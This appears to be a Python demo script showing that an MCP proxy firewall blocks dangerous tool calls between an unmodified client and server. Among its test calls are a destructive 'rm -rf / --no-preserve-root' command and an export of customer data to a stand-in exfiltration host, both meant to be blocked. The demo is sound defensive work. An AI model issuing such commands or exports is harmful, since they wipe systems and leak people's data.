"""Proof: the transparent MCP proxy firewalls a real client<->server, zero integration.

We launch a normal MCP client (the official SDK's stdio client) but point it at
`python -m voan.mcp_proxy --allow acme.com -- python _mcp_server.py` instead of the
server directly. Neither the client code nor the server code knows Voan exists — yet
a destructive `run_command` and an exfil `export_data` are blocked before reaching
the server, while a benign `check_order` passes through.

    pip install "voan[examples]"
    python examples/mcp_proxy_demo.py
"""
import pathlib
import sys

try:
    sys.stdout.reconfigure(encoding="utf-8")
except (AttributeError, ValueError):
    pass

import anyio
from mcp import ClientSession
from mcp.client.stdio import StdioServerParameters, stdio_client

HERE = pathlib.Path(__file__).resolve().parent


def _text(res):
    try:
        return res.content[0].text
    except Exception:
        return str(res)


async def main():
    params = StdioServerParameters(command=sys.executable, args=[
        "-m", "voan.mcp_proxy", "--allow", "acme.com", "--",
        sys.executable, str(HERE / "_mcp_server.py")])
    print("\n  Transparent MCP proxy — client and server unmodified\n")
    async with stdio_client(params) as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()
            calls = [
                ("check_order", {"order_id": "ORD-1001"}, "benign lookup"),
                ("run_command", {"command": "rm -rf / --no-preserve-root"}, "destructive"),
                ("export_data", {"dataset": "customers",
                                 "dest": "exfil.evil-collector.net"}, "exfil"),
                ("export_data", {"dataset": "report",
                                 "dest": "backups.acme.com"}, "legit export"),
            ]
            for name, args, label in calls:
                res = await session.call_tool(name, args)
                blocked = getattr(res, "isError", False)
                icon = "🛑" if blocked else "✅"
                print(f"  {icon} {name:<13} {label:<12} -> {_text(res)[:60]}")
    print()


if __name__ == "__main__":
    anyio.run(main)
